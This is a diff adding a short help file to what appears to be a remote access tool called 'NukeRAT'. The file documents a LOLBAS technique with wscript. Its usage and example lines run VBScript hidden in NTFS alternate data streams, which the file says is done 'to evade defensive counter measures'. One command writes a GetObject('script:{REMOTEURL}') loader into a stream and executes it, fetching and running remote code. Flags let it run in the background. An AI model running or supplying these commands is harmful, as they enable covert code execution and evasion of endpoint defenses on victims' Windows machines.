@@ -1,0 +1,18 @@
+ABOUT
+    Windows utility to execute scripts. LOLBAS documents execute
+    hidden code to evade defensive counter measures.
+
+USAGE:
+    wscript //e:vbscript {PATH}:script.vbs
+    echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+
+EXAMPLES:
+    wscript //e:vbscript {PATH}:script.vbs
+    echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    wscript //e:vbscript {PATH}:script.vbs
